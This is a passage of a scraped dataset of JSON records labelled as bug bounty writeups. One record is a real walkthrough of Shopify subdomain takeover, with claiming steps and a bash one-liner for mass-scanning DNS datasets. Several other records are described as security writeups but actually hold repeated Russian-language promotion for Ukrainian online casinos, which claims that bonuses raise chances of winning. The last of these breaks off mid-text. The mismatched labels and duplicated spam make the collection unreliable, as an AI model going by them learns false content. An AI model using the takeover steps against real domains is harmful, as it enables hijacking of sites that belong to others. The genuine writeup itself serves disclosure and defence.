казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://medium.com/@thebuckhacker/how-to-do-55-000-subdomain-takeover-in-a-blink-of-an-eye-a94954c3fc75", "title": "How to do 55.000+ Subdomain Takeover in a Blink of an Eye | by buckhacker | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@thebuckhacker/how-to-do-55-000-subdomain-takeover-in-a-blink-of-an-eye-a94954c3fc75. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow to do 55.000+ Subdomain Takeover in a Blink of an Eye | by buckhacker | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How to do 55.000+ Subdomain Takeover in a Blink of an Eye buckhacker 6 min read · Sep 10, 2018 -- 3 Listen Share TL;DR In this article we will describe a process that allowed us to identify more then 55.000 subdomains vulnerable to Subdomain Takeover on Shopify platform. Background First of all we would like to mention that this is not a specific issue that can be found just on Shopify, this is common to several others cloud service providers. In the past weeks / days we contacted several different cloud providers regarding this problem and we were impressed with the Shopify Security Guys: fast response, super aware of the problem and great communications. Really kudos to them, they really know how to deal with the cybersecurity research community. First of all what is Shopify? Let’s take a look at the Wikipedia description. Press enter or click to view image in full size Shopify of Wikipedia Basically, it is a cloud service provider that allows you to create an e-commerce website in a super easy way. Now if you are already familiar with the Subdomain Takeover vulnerability on Shopify you can directly jump to the end of this article where we show how to do it on a large scale. Subdomain Takeovers on Shopify During a BugBounty Program or a Pen Testing activity, if you encounter one of the two following web pages, you can have a Subdomain Takeover. Press enter or click to view image in full size If you see this page you have a potential SubDomain Takeover Press enter or click to view image in full size Another example of vulnerable page Let’s see what are the steps to be sure about it. First of all you can do a Subdomain Takeover on Shopify with two types of DNS records: Mapping with application name (CNAMES pointing to myshopname.myshopify.com) Mapping with DNS (CNAMES pointing to shops.myshopify.com) There could be also other methods too (maybe legacy), which we’ll investigate in the near future. Case #1 Mapping with application name In this example we setup a CNAME for shop.buckhacker.com pointing to buckhacker.shopify.com nslookup on shop.buckhacker.com Now if the shop name buckhacker is not claimed on Shopify we could claim it and perform the Subdomain Takeover. How we can check if a shop name is claimed or not ? During the account registration phase you are forced to choose your shop name. If you go on this page you can easy figure out if the shop name is available: Example of not available shop name Example of available shop name If you take a look with Burp what is happening behind you can see a request to a rest API that can gives to you two types of responses: #1 Unavailable ({“status”:”unavailable”,”message”:null,”host”:”buckhacker.myshopify.com”}) #2 Available ({“status”:”available”,”message”:null,”host”:”buckhacker2.myshopify.com”}) You can develop a script that checks if a domain is available or not. To save you time we release a simple script on our GitHub page. At this point if we found that the shop name is available we need simply to connect it in the Shopify portal. Let’s take a look how to do it. Once you login in the shopify website go to the left menu on “Online Store” and then “Domains”: Domains Settings on the left menu Now click on “Connect existing domain”: In the next form write down the vulnerable domain: Press enter or click to view image in full size Click on “Next” and then “Verify Connection” Press enter or click to view image in full size Now if you performed all steps correctly you will be redirected to the following page: Press enter or click to view image in full size If you reached this point you have successfully performed a subdomain takeover. This case is more rare to find because you choose the shop name in the account creation procedure. So in order to have it available the user needs to delete the whole account or change it. During our investigation we identified that 2% of the websites were affected by this misconfiguration. Case #2 Mapping with DNS In the second case the subdomain is a CNAME pointing to shops.myshopify.com. Let’s look at this example that we created for this case: This is the most common case of subdomain takeover on Shopify. Basically in this case we can create a shop with any available name and just connect it from the Shopify portal as described in the previous case. Here some screenshots that illustrate the process: Connecting sales.buckhacker.com to my shop Here the confirmation: Successful connection of the vulnerable subdomain Another confirmation: Another confirmation Large scale exploitation We already told in previous articles how the project Sonar and the FDNS dataset is fantastic to identify vulnerabilities. Press enter or click to view image in full size FDNS Dataset The FDNS dataset provides, among other things, CNAMES records. Basically we can look inside this dataset all the subdomains with a CNAME pointing to shop.myshopify.com or myshopname.shopify.com and then perform the subdomain takeover check. Press enter or click to view image in full size subdomains of buckhacker.com in the FDNS Dataset All this could be done with our simple script and one line of bash: zcat $FDNS_DATASET | strings | grep shopify.com | cut -d “\\”” -f 8 | grep -v “shopify.com” | while read subdomain; do python3 ShopifySubdomainTakeoverCheck.py $subdomain; done First of all we need to explain why we have developed a new script to check for Subdomain Takeovers on Shopify when there are many already available. Most of the other scripts currently available, are detecting a Subdomain Takeover just based on the Shopify error message page, but, this could result in a lot of cases a false positive. We identified many pages with the “vulnerable” error message page, but just a small percentage of them was vulnerable to a Subdomain Takeover. Our simple script is performing three checks: page error message, CNAME and then, if needed, performs the REST API request (as described at the beginning of the blog post). We’ll hope in the next future Subdomain Takeover tools will implement similar techniques to reduce the number of false positives. If you use the script on all the FDNSv2 datasets (from the beginning of 2017 and with some additional tuning) the results are impressive: more then 55.000 subdomains are vulnerable to Subdomain Takeover. Now you can use this data and check if your BugBounty / Costumers domain names are present in this list. It is crystal clear that you can use this technique also on other cloud service providers. Conclusions We think this research could give a glimpse as to how large and underestimated the Subdomain Takeover phenomena is. We think, with cloud computing, we are in a new era of vulnerability research, instead of looking in process heap and stack we need to think in a large scale, for example by looking at DNS records mapping. Maybe we need to think about cloud platforms, and even the Internet itself, as a one big operating system. Hope you enjoyed this article; feedback is welcome ! Timeline 21 August 2018 — Report to Shopify via HackerOne Program 21 August 2018 — First initial feedback from Shopify 23 August 2018 — Second feedback from Shopify 10 September 2018 — Publication Medium Bug Bounty Cloud Computing -- -- 3 Written by buckhacker 209 followers · 1 following www.buckhacker.com — a search engine for buckets Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.mohamedharon.com/2019/11/subdomain-takeover-via.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2019/11/subdomain-takeover-via.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://www.mohamedharon.com/2018/10/subdomain-takeover-via-shopify-vendor.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2018/10/subdomain-takeover-via-shopify-vendor.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. 